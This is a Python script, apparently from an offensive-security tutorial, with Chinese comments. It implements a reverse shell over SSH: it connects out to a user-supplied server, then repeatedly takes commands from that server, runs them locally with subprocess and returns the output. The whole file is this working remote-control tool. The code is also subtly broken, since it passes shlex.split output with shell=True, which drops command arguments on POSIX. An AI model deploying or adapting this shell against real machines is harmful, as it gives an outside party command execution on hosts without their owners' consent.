import paramiko
import shlex
import subprocess


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)  # 这条指令指的是 'ClientConnected'
        print(ssh_session.recv(1024).decode(errors='replace'))  # 输出服务器返回的消息
        while True:
            command = ssh_session.recv(1024)  # 从SSH连接里不断读取命令，然后在本地执行，再把结果返回服务器
            try:
                cmd = command.decode(errors='replace')
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send((str(e).encode(errors='replace')))
        client.close()
    return


if __name__ == '__main__':
    import getpass
    user = input('Username: ')
    password = getpass.getpass()

    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, password, 'ClientConnected')

